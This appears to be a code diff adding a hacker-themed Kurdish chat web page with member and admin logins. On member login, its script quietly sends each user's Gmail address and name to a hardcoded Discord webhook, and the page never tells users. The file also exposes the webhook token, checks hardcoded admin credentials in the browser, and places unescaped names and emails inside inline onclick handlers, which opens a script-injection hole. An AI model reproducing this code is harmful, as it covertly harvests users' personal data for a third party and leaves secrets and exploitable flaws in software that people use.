@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XOSHNAW404 // CYBER CORE</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&display=swap');
+
+        :root {
+            --bg-color: #000000;
+            --main-red: #ff003c;
+            --dark-red: #4a0011;
+            --main-green: #00ff66;
+            --panel-bg: rgba(5, 0, 2, 0.94);
+            --font-family: 'Fira Code', monospace, 'Courier New', Courier;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-family);
+            user-select: none;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--main-red);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        /* Matrix Canvas Background */
+        #matrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.35;
+        }
+
+        /* Watermark Background */
+        .watermark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-10deg);
+            font-size: 11vw;
+            font-weight: 900;
+            color: rgba(255, 0, 60, 0.08);
+            text-shadow: 0 0 30px rgba(255, 0, 60, 0.2);
+            z-index: 2;
+            pointer-events: none;
+            letter-spacing: 12px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            animation: watermarkPulse 4s infinite alternate;
+        }
+
+        @keyframes watermarkPulse {
+            0% { opacity: 0.05; text-shadow: 0 0 20px rgba(255,0,60,0.1); }
+            100% { opacity: 0.12; text-shadow: 0 0 50px rgba(255,0,60,0.4); }
+        }
+
+        .scanline {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%, 
+                rgba(0, 0, 0, 0.6) 50%
+            ), linear-gradient(
+                90deg,
+                rgba(255, 0, 0, 0.05),
+                rgba(0, 0, 0, 0.01),
+                rgba(255, 0, 0, 0.05)
+            );
+            background-size: 100% 3px, 6px 100%;
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 4;
+            width: 98%;
+            max-width: 1250px;
+            height: 92vh;
+            background: var(--panel-bg);
+            border: 2px solid var(--main-red);
+            box-shadow: 0 0 35px rgba(255, 0, 60, 0.3), inset 0 0 20px rgba(255, 0, 60, 0.15);
+            border-radius: 4px;
+            display: flex;
+            flex-direction: column;
+            backdrop-filter: blur(8px);
+        }
+
+        .glitch-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-align: center;
+            color: var(--main-red);
+            text-shadow: 0 0 10px var(--main-red);
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            animation: glitch 1.5s infinite;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 var(--main-red), -2px 0 #000; }
+            50% { text-shadow: -2px 0 var(--main-red), 2px 0 #000; }
+            100% { text-shadow: 2px 0 var(--main-red), -2px 0 #000; }
+        }
+
+        /* Dual Task Login Screen */
+        #authScreen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            padding: 20px;
+        }
+
+        .auth-box {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid var(--main-red);
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(255, 0, 60, 0.25);
+            position: relative;
+        }
+
+        .task-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--dark-red);
+        }
+
+        .task-btn {
+            flex: 1;
+            padding: 12px;
+            background: transparent;
+            border: none;
+            color: #777;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 0.85rem;
+        }
+
+        .task-btn.active {
+            color: var(--main-green);
+            border-bottom: 2px solid var(--main-green);
+            text-shadow: 0 0 8px var(--main-green);
+        }
+
+        .task-btn.admin-tab.active {
+            color: var(--main-red);
+            border-bottom: 2px solid var(--main-red);
+            text-shadow: 0 0 8px var(--main-red);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            color: #aaa;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 1px solid var(--dark-red);
+            color: var(--main-red);
+            outline: none;
+            font-size: 1rem;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--main-red);
+            box-shadow: 0 0 12px rgba(255, 0, 60, 0.5);
+        }
+
+        .hack-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--dark-red);
+            border: 1px solid var(--main-red);
+            color: var(--main-red);
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            text-shadow: 0 0 5px var(--main-red);
+            transition: 0.2s;
+        }
+
+        .hack-btn:hover {
+            background: var(--main-red);
+            color: #000;
+            box-shadow: 0 0 20px var(--main-red);
+        }
+
+        .error-msg {
+            color: var(--main-red);
+            font-size: 0.85rem;
+            margin-top: 15px;
+            text-align: center;
+            min-height: 20px;
+            font-weight: bold;
+        }
+
+        /* Chat Screen Layout */
+        #chatScreen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .chat-header {
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.9);
+            border-bottom: 1px solid var(--main-red);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--main-red);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--main-red);
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .badge-admin {
+            color: #000;
+            background: var(--main-red);
+            padding: 2px 8px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            border-radius: 2px;
+            box-shadow: 0 0 10px var(--main-red);
+        }
+
+        .chat-main-body {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+        }
+
+        .chat-body {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Admin Advanced Gmail & Online/Offline Monitor Sidebar */
+        .admin-sidebar {
+            width: 340px;
+            background: rgba(0, 0, 0, 0.95);
+            border-right: 1px solid var(--main-red);
+            display: none;
+            flex-direction: column;
+            padding: 15px;
+            overflow-y: auto;
+            gap: 15px;
+        }
+
+        .section-title {
+            font-size: 0.8rem;
+            font-weight: bold;
+            color: var(--main-red);
+            padding-bottom: 5px;
+            border-bottom: 1px solid var(--dark-red);
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .admin-members-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .admin-member-card {
+            background: rgba(25, 0, 5, 0.9);
+            border: 1px solid var(--dark-red);
+            padding: 8px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .admin-member-card.offline-card {
+            background: rgba(15, 15, 15, 0.8);
+            border-color: #333;
+        }
+
+        .admin-member-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .admin-member-name {
+            color: #fff;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        .admin-member-gmail {
+            font-size: 0.75rem;
+            color: var(--main-green);
+            font-family: monospace;
+            word-break: break-all;
+        }
+
+        .offline-card .admin-member-gmail {
+            color: #888;
+        }
+
+        .online-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--main-green);
+            border-radius: 50%;
+            box-shadow: 0 0 5px var(--main-green);
+        }
+
+        .offline-dot {
+            width: 7px;
+            height: 7px;
+            background: #666;
+            border-radius: 50%;
+        }
+
+        .message {
+            max-width: 80%;
+            padding: 10px 14px;
+            background: rgba(20, 0, 5, 0.85);
+            border-right: 3px solid var(--main-red);
+            position: relative;
+            word-wrap: break-word;
+            animation: fadeIn 0.2s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message.own {
+            align-self: flex-start;
+            border-right: none;
+            border-left: 3px solid var(--main-green);
+            background: rgba(0, 20, 10, 0.85);
+        }
+
+        .msg-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: #888;
+            margin-bottom: 5px;
+            gap: 15px;
+        }
+
+        .msg-user {
+            color: var(--main-red);
+            font-weight: bold;
+        }
+
+        .message.own .msg-user {
+            color: var(--main-green);
+        }
+
+        .msg-content {
+            color: #eee;
+            font-size: 0.95rem;
+            white-space: pre-wrap;
+            user-select: text;
+        }
+
+        .msg-actions {
+            margin-top: 5px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .action-btn {
+            background: transparent;
+            border: none;
+            color: var(--main-red);
+            font-size: 0.75rem;
+            cursor: pointer;
+            opacity: 0.8;
+            transition: 0.2s;
+        }
+
+        .action-btn:hover {
+            opacity: 1;
+            text-shadow: 0 0 5px var(--main-red);
+        }
+
+        .chat-footer {
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.9);
+            border-top: 1px solid var(--main-red);
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 12px;
+            background: #000;
+            border: 1px solid var(--dark-red);
+            color: var(--main-red);
+            outline: none;
+        }
+
+        .chat-input:focus {
+            border-color: var(--main-red);
+            box-shadow: 0 0 10px rgba(255,0,60,0.3);
+        }
+
+        .btn-small {
+            padding: 5px 12px;
+            font-size: 0.8rem;
+            background: transparent;
+            border: 1px solid var(--main-red);
+            color: var(--main-red);
+            cursor: pointer;
+        }
+
+        .btn-small:hover {
+            background: var(--main-red);
+            color: #000;
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--dark-red); border: 1px solid var(--main-red); }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+    <div class="watermark">XOSHNAW404</div>
+    <div class="scanline"></div>
+
+    <div class="container">
+        <!-- Dual Task Login Screen -->
+        <div id="authScreen">
+            <div class="glitch-title">☠️ XOSHNAW404 // SYSTEM ACCESS ☠️</div>
+            <div class="auth-box">
+                <div class="task-tabs">
+                    <button class="task-btn active" onclick="switchTask('user')">💬 تاسکی ئەندام (Gmail)</button>
+                    <button class="task-btn admin-tab" onclick="switchTask('admin')">👑 تاسکی ئادمین (Admin)</button>
+                </div>
+
+                <!-- Task 1: Member Login -->
+                <div id="userTaskForm">
+                    <div class="input-group">
+                        <label>جیمەیڵی ڕاستەقینە (Real Gmail)</label>
+                        <input type="email" id="loginEmail" placeholder="example@gmail.com" autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label>ناوی ئارەزوومەندانە (Name)</label>
+                        <input type="text" id="loginName" placeholder="ناوەکەت بنووسە..." autocomplete="off">
+                    </div>
+                    <button class="hack-btn" onclick="loginAsUser()">[ 🔓 چوونە ژوورەوە وەک ئەندام ]</button>
+                </div>
+
+                <!-- Task 2: Admin Login -->
+                <div id="adminTaskForm" style="display: none;">
+                    <div class="input-group">
+                        <label style="color: var(--main-red);">ناوی بەکارهێنەری ئادمین (Username)</label>
+                        <input type="text" id="adminUser" placeholder="superadmin..." autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label style="color: var(--main-red);">وشەی تێپەڕی قورس (Secret Password)</label>
+                        <input type="password" id="adminPass" placeholder="••••••••••••">
+                    </div>
+                    <button class="hack-btn" onclick="loginAsAdmin()">[ 👑 چوونە ژوورەوە وەک ئادمین ]</button>
+                </div>
+
+                <div class="error-msg" id="authError"></div>
+            </div>
+        </div>
+
+        <!-- Main Group Chat View -->
+        <div id="chatScreen">
+            <div class="chat-header">
+                <div class="user-info">
+                    <div class="status-dot"></div>
+                    <span id="displayUsername" style="font-weight: bold;"></span>
+                    <span id="adminBadge" class="badge-admin" style="display: none;">ADMIN</span>
+                    <!-- زانیاری گشتی ئۆنلاین/ئۆفلاین لای سەرەوەی ئەندامەکان -->
+                    <span id="headerStats" style="font-size: 0.75rem; color: #888; margin-right: 15px;"></span>
+                </div>
+                <div>
+                    <button id="btnClearChat" class="btn-small" style="display: none; margin-left: 10px;" onclick="clearAllChat()">پاککردنەوەی چات 🗑️</button>
+                    <button class="btn-small" onclick="logout()">دەرچوون 🚪</button>
+                </div>
+            </div>
+
+            <div class="chat-main-body">
+                <!-- ADMIN ONLY GMAIL MONITOR (ONLINE & OFFLINE SECTIONS) -->
+                <div class="admin-sidebar" id="adminSidebar">
+                    <div>
+                        <div class="section-title">
+                            <span>🟢 ئۆنلاین (Online)</span>
+                            <span id="onlineCount" style="color: var(--main-green);">0</span>
+                        </div>
+                        <div class="admin-members-list" id="adminOnlineList"></div>
+                    </div>
+
+                    <div style="margin-top: 10px;">
+                        <div class="section-title" style="color: #888; border-color: #333;">
+                            <span>🔴 ئۆفلاین (Offline)</span>
+                            <span id="offlineCount" style="color: #888;">0</span>
+                        </div>
+                        <div class="admin-members-list" id="adminOfflineList"></div>
+                    </div>
+                </div>
+
+                <!-- Chat Box -->
+                <div class="chat-body" id="chatBox"></div>
+            </div>
+
+            <div class="chat-footer">
+                <input type="text" id="msgInput" class="chat-input" placeholder="پەیامەکەت بنووسە... (Enter بۆ ناردن)" onkeydown="handleKeyPress(event)">
+                <button class="hack-btn" style="width: 110px;" onclick="sendMessage()">ناردن ⚡</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_CREDENTIALS = {
+            username: "superadmin",
+            password: "Admin#Secret$9988X!@#"
+        };
+
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553142746473046018/59OExN87r_h_CTITipSbM6Ix4wiO32CiQuzmJEL0EAMQNrBsJL07604PB1X1tw9stPFM";
+
+        const chatChannel = new BroadcastChannel('xoshnaw404_hacker_chat');
+        let currentUser = null;
+
+        function sendToDiscord(name, email) {
+            const payload = {
+                content: `🚨 **ئەندامێکی نوێ جۆینی سیستم کرد!**\n👤 **ناو:** ${name}\n📧 **جیمەیڵ:** \`${email}\`\n⚡ **سەکۆ:** XOSHNAW404 // CYBER CORE`
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Discord error:", err));
+        }
+
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playBeep(freq = 200, type = 'sawtooth', duration = 0.15) {
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch(e) {}
+        }
+
+        function initStorage() {
+            if (!localStorage.getItem('chat_messages')) localStorage.setItem('chat_messages', JSON.stringify([]));
+            if (!localStorage.getItem('banned_emails')) localStorage.setItem('banned_emails', JSON.stringify([]));
+            if (!localStorage.getItem('active_members')) localStorage.setItem('active_members', JSON.stringify([]));
+            if (!localStorage.getItem('registered_users')) localStorage.setItem('registered_users', JSON.stringify([]));
+        }
+        initStorage();
+
+        // Canvas Matrix Effect
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const chars = "☠️⚡404XOSHNAW0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.06)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#ff003c";
+            ctx.font = fontSize + "px monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+
+        function switchTask(task) {
+            playBeep(300, 'square', 0.08);
+            document.getElementById('authError').innerText = '';
+            const userBtn = document.querySelectorAll('.task-btn')[0];
+            const adminBtn = document.querySelectorAll('.task-btn')[1];
+
+            if (task === 'user') {
+                userBtn.classList.add('active');
+                adminBtn.classList.remove('active');
+                document.getElementById('userTaskForm').style.display = 'block';
+                document.getElementById('adminTaskForm').style.display = 'none';
+            } else {
+                adminBtn.classList.add('active');
+                userBtn.classList.remove('active');
+                document.getElementById('userTaskForm').style.display = 'none';
+                document.getElementById('adminTaskForm').style.display = 'block';
+            }
+        }
+
+        function isValidRealGmail(email) {
+            const gmailRegex = /^[a-zA-Z0-9.]+@gmail\.com$/;
+            if (!gmailRegex.test(email)) return false;
+            const usernamePart = email.split('@')[0];
+            if (usernamePart.length < 6 || usernamePart.length > 30) return false;
+            const fakeKeywords = ["temp", "fake", "test", "disposable", "mailinator", "trash", "123456"];
+            for (let word of fakeKeywords) {
+                if (usernamePart.toLowerCase().includes(word)) return false;
+            }
+            return true;
+        }
+
+        function loginAsUser() {
+            const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+            const name = document.getElementById('loginName').value.trim();
+            const err = document.getElementById('authError');
+
+            if (!email || !name) {
+                err.innerText = "❌ تکایە جیمەیڵ و ناوی خۆت پڕبکەرەوە!";
+                playBeep(120, 'sawtooth', 0.3);
+                return;
+            }
+
+            if (!isValidRealGmail(email)) {
+                err.innerText = "❌ ئەم ئیمەیڵە دروست نییە! تکایە جیمەیڵێکی ڕاستەقینە بنووسە (example@gmail.com)";
+                playBeep(120, 'sawtooth', 0.3);
+                return;
+            }
+
+            const banned = JSON.parse(localStorage.getItem('banned_emails'));
+            if (banned.includes(email)) {
+                err.innerText = "🚫 ئەم جیمەیڵە لەلایەن بەڕێوەبەرەوە بلۆک کراوە (BANNED)!";
+                playBeep(100, 'sawtooth', 0.4);
+                return;
+            }
+
+            currentUser = { email: email, name: name, isAdmin: false };
+
+            registerUserGlobally(currentUser);
+            addMemberToActiveList(currentUser);
+            sendToDiscord(name, email);
+            enterChatSystem();
+        }
+
+        function loginAsAdmin() {
+            const u = document.getElementById('adminUser').value.trim();
+            const p = document.getElementById('adminPass').value.trim();
+            const err = document.getElementById('authError');
+
+            if (!u || !p) {
+                err.innerText = "❌ ناوی بەکارهێنەر یان پاسۆرد پڕبکەرەوە!";
+                playBeep(120, 'sawtooth', 0.3);
+                return;
+            }
+
+            if (u === ADMIN_CREDENTIALS.username && p === ADMIN_CREDENTIALS.password) {
+                currentUser = { email: "admin@xoshnaw404.local", name: "👑 ADMIN", isAdmin: true };
+                addMemberToActiveList(currentUser);
+                enterChatSystem();
+            } else {
+                err.innerText = "❌ ناوی بەکارهێنەر یان پاسۆردی ئادمین هەڵەیە!";
+                playBeep(100, 'sawtooth', 0.4);
+            }
+        }
+
+        function enterChatSystem() {
+            playBeep(500, 'sine', 0.2);
+            document.getElementById('authScreen').style.display = 'none';
+            document.getElementById('chatScreen').style.display = 'flex';
+            
+            document.getElementById('displayUsername').innerText = currentUser.name;
+            
+            if (currentUser.isAdmin) {
+                document.getElementById('adminBadge').style.display = 'inline-block';
+                document.getElementById('btnClearChat').style.display = 'inline-block';
+                document.getElementById('adminSidebar').style.display = 'flex';
+                document.getElementById('headerStats').style.display = 'none';
+                renderAdminDashboard();
+            } else {
+                document.getElementById('adminBadge').style.display = 'none';
+                document.getElementById('btnClearChat').style.display = 'none';
+                document.getElementById('adminSidebar').style.display = 'none';
+                document.getElementById('headerStats').style.display = 'inline-block';
+                updateHeaderStats();
+            }
+
+            renderMessages();
+        }
+
+        function logout() {
+            playBeep(250, 'sine', 0.1);
+            if (currentUser) {
+                removeMemberFromActiveList(currentUser.email);
+            }
+            currentUser = null;
+            document.getElementById('chatScreen').style.display = 'none';
+            document.getElementById('authScreen').style.display = 'flex';
+            document.getElementById('loginEmail').value = '';
+            document.getElementById('loginName').value = '';
+            document.getElementById('adminUser').value = '';
+            document.getElementById('adminPass').value = '';
+            document.getElementById('authError').innerText = '';
+        }
+
+        function registerUserGlobally(user) {
+            let reg = JSON.parse(localStorage.getItem('registered_users'));
+            if (!reg.some(u => u.email === user.email)) {
+                reg.push(user);
+                localStorage.setItem('registered_users', JSON.stringify(reg));
+            }
+        }
+
+        function addMemberToActiveList(user) {
+            let members = JSON.parse(localStorage.getItem('active_members'));
+            members = members.filter(m => m.email !== user.email);
+            members.push(user);
+            localStorage.setItem('active_members', JSON.stringify(members));
+            chatChannel.postMessage({ type: 'MEMBERS_UPDATE' });
+        }
+
+        function removeMemberFromActiveList(email) {
+            let members = JSON.parse(localStorage.getItem('active_members'));
+            members = members.filter(m => m.email !== email);
+            localStorage.setItem('active_members', JSON.stringify(members));
+            chatChannel.postMessage({ type: 'MEMBERS_UPDATE' });
+        }
+
+        function updateHeaderStats() {
+            const active = JSON.parse(localStorage.getItem('active_members')).length;
+            const registered = JSON.parse(localStorage.getItem('registered_users')).length;
+            const offline = Math.max(0, registered - active);
+            document.getElementById('headerStats').innerText = `🟢 ئۆنلاین: ${active} | 🔴 ئۆفلاین: ${offline}`;
+        }
+
+        // Render Online & Offline Dashboard for ADMIN
+        function renderAdminDashboard() {
+            if (!currentUser || !currentUser.isAdmin) return;
+
+            const onlineList = document.getElementById('adminOnlineList');
+            const offlineList = document.getElementById('adminOfflineList');
+            const onlineCount = document.getElementById('onlineCount');
+            const offlineCount = document.getElementById('offlineCount');
+
+            onlineList.innerHTML = '';
+            offlineList.innerHTML = '';
+
+            const activeMembers = JSON.parse(localStorage.getItem('active_members'));
+            const registeredUsers = JSON.parse(localStorage.getItem('registered_users'));
+
+            onlineCount.innerText = activeMembers.length;
+
+            // Render Online
+            activeMembers.forEach(m => {
+                const card = document.createElement('div');
+                card.className = 'admin-member-card';
+                let kickBtn = !m.isAdmin ? `<button class="action-btn" style="margin-top:3px;" onclick="kickUser('${m.email}', '${m.name}')">🚫 Kick / Ban</button>` : '';
+
+                card.innerHTML = `
+                    <div class="admin-member-head">
+                        <span class="admin-member-name">${m.isAdmin ? '👑 ' : ''}${escapeHTML(m.name)}</span>
+                        <div class="online-dot"></div>
+                    </div>
+                    <div class="admin-member-gmail">${escapeHTML(m.email)}</div>
+                    ${kickBtn}
+                `;
+                onlineList.appendChild(card);
+            });
+
+            // Render Offline (Registered users who are not currently active)
+            const offlineUsers = registeredUsers.filter(reg => !activeMembers.some(act => act.email === reg.email));
+            offlineCount.innerText = offlineUsers.length;
+
+            offlineUsers.forEach(m => {
+                const card = document.createElement('div');
+                card.className = 'admin-member-card offline-card';
+
+                card.innerHTML = `
+                    <div class="admin-member-head">
+                        <span class="admin-member-name" style="color: #aaa;">${escapeHTML(m.name)}</span>
+                        <div class="offline-dot"></div>
+                    </div>
+                    <div class="admin-member-gmail">${escapeHTML(m.email)}</div>
+                    <button class="action-btn" style="margin-top:3px; color:#888;" onclick="kickUser('${m.email}', '${m.name}')">🚫 Ban</button>
+                `;
+                offlineList.appendChild(card);
+            });
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('msgInput');
+            const text = input.value.trim();
+            if (!text) return;
+
+            const banned = JSON.parse(localStorage.getItem('banned_emails'));
+            if (!currentUser.isAdmin && banned.includes(currentUser.email)) {
+                alert("🚫 تۆ دەرپەڕێنراویت!");
+                logout();
+                return;
+            }
+
+            const messages = JSON.parse(localStorage.getItem('chat_messages'));
+            const newMsg = {
+                id: Date.now(),
+                email: currentUser.email,
+                name: currentUser.name,
+                isAdmin: currentUser.isAdmin,
+                text: text,
+                time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' })
+            };
+
+            messages.push(newMsg);
+            localStorage.setItem('chat_messages', JSON.stringify(messages));
+            
+            input.value = '';
+            renderMessages();
+            playBeep(600, 'sine', 0.05);
+
+            chatChannel.postMessage({ type: 'NEW_MSG', data: newMsg });
+        }
+
+        function handleKeyPress(e) {
+            if (e.key === 'Enter') sendMessage();
+        }
+
+        function renderMessages() {
+            const box = document.getElementById('chatBox');
+            box.innerHTML = '';
+            const messages = JSON.parse(localStorage.getItem('chat_messages'));
+
+            messages.forEach(msg => {
+                const div = document.createElement('div');
+                div.className = `message ${msg.email === currentUser?.email ? 'own' : ''}`;
+
+                let adminActions = '';
+                if (currentUser && currentUser.isAdmin && !msg.isAdmin) {
+                    adminActions = `
+                        <div class="msg-actions">
+                            <button class="action-btn" onclick="kickUser('${msg.email}', '${msg.name}')">🚫 Kick / Ban</button>
+                            <button class="action-btn" onclick="deleteMessage(${msg.id})">🗑️ سڕینەوە</button>
+                        </div>
+                    `;
+                }
+
+                div.innerHTML = `
+                    <div class="msg-header">
+                        <span class="msg-user">${msg.isAdmin ? '👑 ' : ''}${escapeHTML(msg.name)}</span>
+                        <span>${msg.time}</span>
+                    </div>
+                    <div class="msg-content">${escapeHTML(msg.text)}</div>
+                    ${adminActions}
+                `;
+                box.appendChild(div);
+            });
+
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function escapeHTML(str) {
+            return str.replace(/[&<>'"]/g, 
+                tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag)
+            );
+        }
+
+        function kickUser(email, name) {
+            if (!currentUser || !currentUser.isAdmin) return;
+
+            const reason = prompt(`💡 هۆکاری دەرپەڕاندنی [ ${name} ] بنووسە:`, "قسەی نەشیاو / کەسی ناپێویست");
+            if (reason !== null) {
+                const banned = JSON.parse(localStorage.getItem('banned_emails'));
+                if (!banned.includes(email.toLowerCase())) {
+                    banned.push(email.toLowerCase());
+                    localStorage.setItem('banned_emails', JSON.stringify(banned));
+                }
+
+                removeMemberFromActiveList(email);
+
+                const messages = JSON.parse(localStorage.getItem('chat_messages'));
+                messages.push({
+                    id: Date.now(),
+                    email: "SYSTEM",
+                    name: "☠️ SYSTEM",
+                    isAdmin: true,
+                    text: `⚠️ [ ${name} ] لەلایەن ئادمینەوە دەرپەڕێندرا (KICKED)!\n📌 هۆکار: ${reason}`,
+                    time: new Date().toLocaleTimeString()
+                });
+                localStorage.setItem('chat_messages', JSON.stringify(messages));
+
+                renderMessages();
+                renderAdminDashboard();
+                chatChannel.postMessage({ type: 'KICK_USER', email: email });
+                playBeep(100, 'sawtooth', 0.4);
+            }
+        }
+
+        function deleteMessage(msgId) {
+            if (!currentUser || !currentUser.isAdmin) return;
+            let messages = JSON.parse(localStorage.getItem('chat_messages'));
+            messages = messages.filter(m => m.id !== msgId);
+            localStorage.setItem('chat_messages', JSON.stringify(messages));
+            renderMessages();
+            chatChannel.postMessage({ type: 'REFRESH' });
+        }
+
+        function clearAllChat() {
+            if (!currentUser || !currentUser.isAdmin) return;
+            if (confirm("⚠️ ئایا دڵنیایت لە پاککردنەوەی تەواوی چاتەکە؟")) {
+                localStorage.setItem('chat_messages', JSON.stringify([]));
+                renderMessages();
+                chatChannel.postMessage({ type: 'REFRESH' });
+            }
+        }
+
+        chatChannel.onmessage = (e) => {
+            const data = e.data;
+            if (data.type === 'NEW_MSG' || data.type === 'REFRESH') {
+                renderMessages();
+                playBeep(800, 'sine', 0.08);
+            } else if (data.type === 'MEMBERS_UPDATE') {
+                if (currentUser && currentUser.isAdmin) {
+                    renderAdminDashboard();
+                } else if (currentUser && !currentUser.isAdmin) {
+                    updateHeaderStats();
+                }
+            } else if (data.type === 'KICK_USER') {
+                if (currentUser && currentUser.email === data.email) {
+                    alert("🚫 تۆ لەلایەن ئادمینەوە دەرپەڕێندرایت!");
+                    logout();
+                } else {
+                    renderMessages();
+                    if (currentUser && currentUser.isAdmin) renderAdminDashboard();
+                    else if (currentUser && !currentUser.isAdmin) updateHeaderStats();
+                }
+            }
+        };
+
+        window.onbeforeunload = () => {
+            if (currentUser) removeMemberFromActiveList(currentUser.email);
+        };
+    </script>
+</body>
+</html>
